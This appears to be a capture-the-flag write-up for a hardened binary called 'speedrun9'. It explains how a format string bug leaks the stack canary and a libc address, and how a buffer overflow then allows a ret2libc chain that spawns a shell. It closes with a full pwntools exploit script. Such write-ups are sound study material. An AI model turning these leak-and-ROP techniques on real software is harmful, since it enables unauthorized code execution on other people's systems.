All protections are on. GOT overwrite is out of the question with full relro. Shellcoding also out of the question with NX bit enabled. PIE will make ROP tough, if we can reach the return address by somehow bypassing the canary.

This binary is stripped as well.

Voila! We have a format string vulnerability! That gives us two options to exploit this program: 1. Leak the canary if we have a buffer overflow so we can overwrite itself with the correct value or 2. Bypass the canary to overwrite the return address of a win function with %n

Time to open Ghidra and see what we can find:

Analyzing this decompiled code, we see that indeed there is a format string vulnerability with the 2nd option, but also, a buffer overflow with the first option. Another thing we notice is the program rejects any input containing the character n (0x6e), so %n-based writes are impossible. That means our second hypothesis will not be viable. If we input 1, we get a massive overflow, where we can target the return address.

So this makes the path of attack pretty clear: We use the 2nd option to leak the canary and a libc address. Then, we can pick option 1 to overwrite the canary with itself, reach the return address and ROP from there. Ret2Libc is the way to go here. After analyzing the functions, I didn’t find a win function. So we can’t really do much with the binary if we leak a PIE address, so libc will be my target.

After that, we need to find a reliable libc address. This took a lot longer than I wanted it to take. There are plenty of libc addresses on the stack. It took a lot of trial and error, using x/i *address* in gdb to see where these libc addresses pointed to. All of them point to different places, some without symbols. I found one that made sense for me to use, which was __libc_start_call_main.

After that, since le.sym['__libc_start_call_main'] wasn’t working for me, I had to go into gdb to find the offset to the base of libc, which I checked with vmmap libc. After getting the base, the exploit becomes trivial. Since we don’t have the PIE base, we have to use our gadgets from libc. With that, here is my final exploit:

from pwn import *

context.arch = 'amd64'

#p = gdb.debug('./speedrun9', '''
#b * read
#c
#''')
e = ELF('./speedrun9')
le = e.libc
p = process('./speedrun9', env={"DEBUG":"1"}) #to stop the alarm
payload = b'2'

payload += b'%71$p'
p.send(payload)
p.recvuntil(b'it "')
canary = int(p.recv(18), 16)
log.success(f'canary value: {hex(canary)}')

#__libc_start_call_main+122
#0x2a1ca
payload2 = b'2'
payload2 += b'%169$p'
p.send(payload2)
p.recvuntil(b'it "')
libcleak = int(p.recv(14), 16)
libcleak &= 0x0000ffffffffffff
log.success(f'libc leak: {hex(libcleak)}')
le.address = libcleak - 0x2a1ca
log.success(f'libc base: {hex(le.address)}')
system = le.sym['system']
log.success(f'system: {hex(system)}')
binsh = next(le.search(b'/bin/sh'))
log.success(f'binsh: {hex(binsh)}')
poprdi = le.address + 0x10f78b 
log.success(f'poprdi: {hex(poprdi)}')
ret = le.address + 0x2882f 
log.success(f'ret: {hex(ret)}')

p.send(b'1')
payload3 = b'A' * 1032
payload3 += p64(canary)
payload3 += b'B' * 8
payload3 += p64(poprdi) + p64(binsh)
payload3 += p64(ret) #for stack alignment (will crash if we call system without an aligned stack) 
payload3 += p64(system)
p.send(payload3)
p.send(b'3')
p.interactive()
